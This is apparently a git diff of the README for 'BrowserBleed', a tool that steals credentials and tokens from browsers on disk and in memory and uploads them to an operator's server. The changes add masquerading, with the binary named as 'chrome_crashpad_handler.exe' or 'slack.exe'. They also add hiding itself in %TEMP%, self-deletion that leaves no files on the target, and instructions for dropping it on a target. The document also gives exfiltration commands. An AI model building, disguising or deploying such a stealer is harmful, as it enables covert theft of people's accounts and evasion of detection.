@@ -150,22 +150,28 @@ Both versions write two files to the same directory as the binary:
 
 ## Usage
 
-When built with a report server baked in (see [Building your own binaries](#building-your-own-binaries)), just drop and run — no flags needed. Results upload automatically and the binary deletes itself.
+When built with a report server baked in (see [Building your own binaries](#building-your-own-binaries)), just drop and run — no flags needed. Results upload automatically and the binary removes itself.
+
+**Default behaviour when a server is baked in:**
+1. Moves itself from the drop location into `%TEMP%` within ~2 seconds — gone from Explorer immediately
+2. Scans all browsers (disk + memory), exfils results to your server
+3. Deletes the `%TEMP%` copy 120 seconds after launch
+4. No local files left anywhere on the target
 
 ### Windows
 
 ```
-BrowserBleed.exe                        # run — auto-exfils, no local files, self-deletes
-BrowserBleed.exe --no-self-delete       # keep the exe after run
-BrowserBleed.exe --out results.txt      # write local file instead of temp (still exfils)
-BrowserBleed.exe --browser chrome       # target one browser
-BrowserBleed.exe --memory-only          # skip disk extraction
-BrowserBleed.exe --disk-only            # skip memory scraping
-BrowserBleed.exe --verify               # verify tokens (makes outbound requests)
-BrowserBleed.exe --max-hits 500         # raise memory hit cap per browser (default: 300)
+chrome_crashpad_handler.exe             # drop and run — exfils, vanishes
+chrome_crashpad_handler.exe --no-self-delete   # keep the binary for testing
+chrome_crashpad_handler.exe --out results.txt  # also write a local file
+chrome_crashpad_handler.exe --browser chrome   # target one browser only
+chrome_crashpad_handler.exe --memory-only      # skip disk extraction
+chrome_crashpad_handler.exe --disk-only        # skip memory scraping
+chrome_crashpad_handler.exe --verify           # verify tokens (outbound requests)
+chrome_crashpad_handler.exe --max-hits 500     # raise memory hit cap (default: 300)
 ```
 
-When running from source (no server baked in), add exfil manually:
+When running from source (no server baked in):
 ```
 python BrowserBleed.py --exfil https://your-server.com --exfil-key YOUR_API_KEY
 ```
@@ -173,14 +179,14 @@ python BrowserBleed.py --exfil https://your-server.com --exfil-key YOUR_API_KEY
 ### macOS
 
 ```bash
-sudo ./BrowserBleed_mac                        # run — auto-exfils, no local files, self-deletes
-sudo ./BrowserBleed_mac --no-self-delete       # keep the binary after run
-sudo ./BrowserBleed_mac --out /tmp/results.txt # write local file instead of temp (still exfils)
-sudo ./BrowserBleed_mac --browser chrome       # target one browser
+sudo ./BrowserBleed_mac                        # drop and run — exfils, self-deletes
+sudo ./BrowserBleed_mac --no-self-delete       # keep the binary for testing
+sudo ./BrowserBleed_mac --out /tmp/results.txt # also write a local file
+sudo ./BrowserBleed_mac --browser chrome       # target one browser only
 sudo ./BrowserBleed_mac --memory-only          # skip disk extraction
 sudo ./BrowserBleed_mac --disk-only            # skip memory scraping
-sudo ./BrowserBleed_mac --verify               # verify tokens (makes outbound requests)
-sudo ./BrowserBleed_mac --max-hits 500         # raise memory hit cap per browser (default: 300)
+sudo ./BrowserBleed_mac --verify               # verify tokens (outbound requests)
+sudo ./BrowserBleed_mac --max-hits 500         # raise memory hit cap (default: 300)
 ```
 
 When running from source:
@@ -323,16 +329,26 @@ EXFIL_URL=https://reports.example.com EXFIL_KEY=mykey ./build_mac.sh
 
 ### Dropping on a target
 
+Drop the built exe anywhere writable on the target and run it. The filename is whatever preset you chose — `chrome_crashpad_handler.exe`, `slack.exe`, etc.
+
 ```
-BrowserBleed.exe          # Windows — exfils automatically, no flags needed
-sudo ./BrowserBleed_mac   # macOS — same
+chrome_crashpad_handler.exe   # Windows — exfils, moves itself to %TEMP%, self-deletes
+sudo ./BrowserBleed_mac       # macOS — exfils, self-deletes
 ```
 
-The report URL is appended to `bb_results.txt` and visible in the browser at your server after logging in with the API key.
+View results at your report server after logging in with the API key.
+
+**Testing locally:** use `--no-self-delete` to keep the binary so you can run it more than once:
+```powershell
+.\chrome_crashpad_handler.exe --no-self-delete
+```
 
 ### Rebuilding after source changes
 
-Re-run the build script — it always patches a temp copy, so the source files stay clean (no credentials in the `.py` files ever).
+Re-run the build script — it always patches a temp copy, so the source files stay clean (no credentials in the `.py` files ever):
+```powershell
+.\build_windows.ps1 -Preset chrome   # or whichever preset you use
+```
 
 ### Report server binary (local dev/test)
 
